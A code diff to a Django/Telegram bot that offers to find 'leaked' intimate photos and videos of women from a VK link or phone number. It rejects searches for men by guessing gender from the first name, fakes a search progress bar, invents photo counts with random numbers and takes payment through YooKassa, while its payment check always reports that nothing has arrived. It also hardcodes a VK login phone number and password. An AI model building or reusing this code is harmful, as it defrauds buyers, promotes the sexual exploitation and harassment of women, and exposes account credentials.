@@ -1,7 +1,14 @@
 from django.db import models
 from django.contrib.auth.models import AbstractUser
 
-import telebot
+import telebot, time, vk_api, pymorphy2, json, os, random, logging, uuid
+from yookassa import Configuration, Payment
+
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
 
 class CustomUser(AbstractUser):
     telegram_id_in_admin_bot = models.CharField(
@@ -240,14 +247,14 @@ class Bot(models.Model):
 
             return instance, created
 
+        @self.bot_instance.callback_query_handler(lambda query: query.data == "menu")
         @self.bot_instance.message_handler(commands=['start'])
         def command_help(message):
             usr, _ = user_get_by_message(message)
             
             keyboard = telebot.types.InlineKeyboardMarkup([
-                [telebot.types.InlineKeyboardButton("🔎 Начать поиск", callback_data='start_search')],
-                [telebot.types.InlineKeyboardButton("💶 Баланс", callback_data="balance_info")],
-                [telebot.types.InlineKeyboardButton("💋 Отзывы", url="https://google.com")],
+                [telebot.types.InlineKeyboardButton("🔎 Начать поиск", callback_data='search_choice')],
+                [telebot.types.InlineKeyboardButton("💋 Отзывы", url="https://t.me/bikph")],
             ])
            
             
@@ -260,14 +267,14 @@ class Bot(models.Model):
             )
 
         @self.bot_instance.message_handler(content_types=['text'], regexp='поиск')
-        @self.bot_instance.callback_query_handler(lambda query: query.data == "start_search")
-        def start_search_handler(message):
+        @self.bot_instance.callback_query_handler(lambda query: query.data == "search_choice")
+        def search_choice_handler(message):
             usr, _ = user_get_by_message(message)
 
             keyboard = telebot.types.InlineKeyboardMarkup([
-                [telebot.types.InlineKeyboardButton("🌍 Вконтакте", callback_data="vk_search")],
-                [telebot.types.InlineKeyboardButton("📞 Viber/Whats\'up", callback_data="phone_search")],
-                [telebot.types.InlineKeyboardButton("📸 Инстаграм", callback_data="insta_search")],
+                [telebot.types.InlineKeyboardButton("🌍 Вконтакте", callback_data="start_search")],
+                [telebot.types.InlineKeyboardButton("📞 Viber/Whats\'up", callback_data="start_search")],
+                [telebot.types.InlineKeyboardButton("📸 Инстаграм", callback_data="start_search")],
             ])
 
             self.bot_instance.send_message(
@@ -277,6 +284,150 @@ class Bot(models.Model):
                 reply_markup=keyboard,
                 disable_web_page_preview=True
             )
+
+        @self.bot_instance.callback_query_handler(lambda query: query.data == "start_search")
+        def start_search(message):
+            usr, _ = user_get_by_message(message)
+
+            keyboard = telebot.types.InlineKeyboardMarkup([
+                [telebot.types.InlineKeyboardButton("📥 Меню", callback_data="menu")],
+            ])
+
+
+            self.bot_instance.send_message(
+                chat_id=usr.telegram_id,
+                text=f"💌 Хорошо, <b>{usr.username}</b>, отправь мне ссылку на пользователя.",
+                parse_mode="HTML",
+                reply_markup=keyboard,
+            )
+
+        @self.bot_instance.message_handler(content_types=['text'], regexp="^\\+?[1-9][0-9]{7,14}$")
+        @self.bot_instance.message_handler(content_types=['text'], regexp="((http|https)\:\/\/)?[a-zA-Z0-9\.\/\?\:@\-_=#]+\.([a-zA-Z]){2,6}([a-zA-Z0-9\.\&\/\?\:@\-_=#])*")  
+        def link_valid(message):
+            usr, _ = user_get_by_message(message)
+            link = message.text.strip()
+            
+            if ("vk" in link):
+                try:
+                    vk_session = vk_api.VkApi('+79097990305', 'Ilovemarina25')
+                    vk_session.auth()
+
+                    user = vk_session.method("users.get", {"user_ids": link.split("/")[-1]}) # вместо 1 подставляете айди нужного юзера
+                    fn = user[0]['first_name']
+                    
+                    morph = pymorphy2.MorphAnalyzer()
+                    parsed_word = morph.parse(fn)[0]
+                    g = parsed_word.tag.gender
+                    
+                    if g.lower() != "femn":
+                        self.bot_instance.send_message(
+                            usr.telegram_id,
+                            f"🥺 К сожалению, мы пока не ищем сливы мужчин.",
+                            parse_mode="HTML"
+                        )
+
+                        return 
+
+                except:
+                    self.bot_instance.send_message(
+                        usr.telegram_id,
+                        f"🥺 К сожалению, ссылка прислана с ошибкой. Попробуйте еще раз.",
+                        parse_mode="HTML"
+                    )
+                    return
+
+            startin_text = list("🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥")
+            msg = self.bot_instance.send_message(
+                usr.telegram_id,
+                f"Выполянем поиск... 🔎\n\n✅ Страница найдена в базе\n\n⏳ Отправка материала... <b>{0}%</b>\n{''.join(startin_text)}",
+                parse_mode="HTML"
+            )
+
+            for index in range(len(startin_text)):
+                startin_text[index] = "🟩"
+                self.bot_instance.edit_message_text(
+                    f"Выполянем поиск... 🔎\n\n✅ Страница найдена в базе\n\n⏳ Отправка материала... <b>{(index + 1) * 10}%</b>\n{''.join(startin_text)}",
+                    usr.telegram_id,
+                    msg.id
+                )
+                time.sleep(0.5)
+            
+            Configuration.account_id = os.environ.get("SHOP_ID")
+            Configuration.secret_key = os.environ.get("SHOP_API_TOKEN")
+            
+            payment399_id = str(uuid.uuid4())
+            payment_399 = Payment.create({
+                "amount": {
+                    "value": 5,
+                "currency": "RUB"
+            },
+                
+            "confirmation": {
+                "type": "redirect",
+                "return_url": f'http://{os.environ.get("HOST")}:{os.environ.get("PORT")}/confirm_payment/?payment_id={payment399_id}&bot_username={self.bot_username}&payeer_username={usr.username}&amt=399'
+            },
+            "capture": True,
+            "description": 'Оплата информационных услуг.'
+            })
+            payment_data = json.loads(payment_399.json())
+            payment399_url = (payment_data['confirmation'])['confirmation_url']
+            
+            payment199_id = str(uuid.uuid4())
+            payment_199 = Payment.create({
+                "amount": {
+                    "value": 5,
+                "currency": "RUB"
+            },
+                
+            "confirmation": {
+                "type": "redirect",
+                "return_url": f'http://{os.environ.get("HOST")}:{os.environ.get("PORT")}/confirm_payment/?payment_id={payment199_id}&bot_username={self.bot_username}&payeer_username={usr.username}&amt=199'
+            },
+            "capture": True,
+            "description": 'Оплата информационных услуг.'
+            })
+            payment_data = json.loads(payment_199.json())
+            payment199_url = (payment_data['confirmation'])['confirmation_url']
+            
+            
+            kb = telebot.types.InlineKeyboardMarkup([
+                [telebot.types.InlineKeyboardButton("Приобрести 💳|199₽", url=str(payment199_url).strip())],
+                [telebot.types.InlineKeyboardButton("Купить безлимит 💳|399₽", url=str(payment399_url).strip())],
+                [telebot.types.InlineKeyboardButton("Проверить оплату ✅", callback_data="check_payment")],
+            ])
+
+            self.bot_instance.send_photo(
+                chat_id=usr.telegram_id,
+                photo="https://sun9-51.userapi.com/impg/LA8QLJqXNeiDAlF2ljlbyzAa4xE835jo6CZbEw/fUs8hTMKmIg.jpg?size=800x1550&quality=95&sign=127fdd19fa59b28301f2e325e6e5aa19&type=album",
+                caption=f"Слив найден ✅\n\n<b>Интим фото:</b>{random.randint(10, 50)} шт.\n<b>Интим видео:</b>{random.randint(1, 10)} шт.", 
+                parse_mode="HTML", 
+                reply_markup=kb
+            )
+
+            self.bot_instance.send_message(
+                usr.telegram_id,
+                parse_mode="HTML", 
+                reply_markup=kb
+            )
+
+        @self.bot_instance.callback_query_handler(lambda query: query.data == "check_payment")
+        def check_payment(message):
+            usr, _ = user_get_by_message(message)
+            keyboard = telebot.types.InlineKeyboardMarkup([
+                [telebot.types.InlineKeyboardButton("📥 Меню", callback_data="menu")],
+            ])
+
+
+            self.bot_instance.send_message(
+                chat_id=usr.telegram_id,
+                text=f"😪 Оплата пока не прошла. Пожалуйста, подождите.",
+                parse_mode="HTML",
+                reply_markup=keyboard,
+            )
+
+        @self.bot_instance.message_handler()
+        def garbage(message):
+            self.bot_instance.send_message(message.chat.id, 'Я пока не знаю, как на такое реагировать! 🥺')
 
         try:
             self.bot_instance.polling(none_stop=True)
@@ -320,3 +471,29 @@ class TGUser(models.Model):
     class Meta:
         verbose_name = 'Telegram User'
         verbose_name_plural = 'Telegram Users'
+
+class TGPayment(models.Model):
+    amt = models.BigIntegerField(
+        verbose_name="TGPayment",
+        null=False,
+        default=0
+    )
+
+    payment_id = models.CharField(
+        verbose_name="TGPaymentID",
+        max_length=255,
+        null=False,
+        default="No ID"
+    )
+
+    payeer = models.ForeignKey(
+        TGUser,
+        verbose_name="Person, who pays",
+        on_delete=models.CASCADE
+    )
+
+    bot = models.ForeignKey(
+        Bot,
+        verbose_name="Bot, connected to payment",
+        on_delete=models.CASCADE
+    )
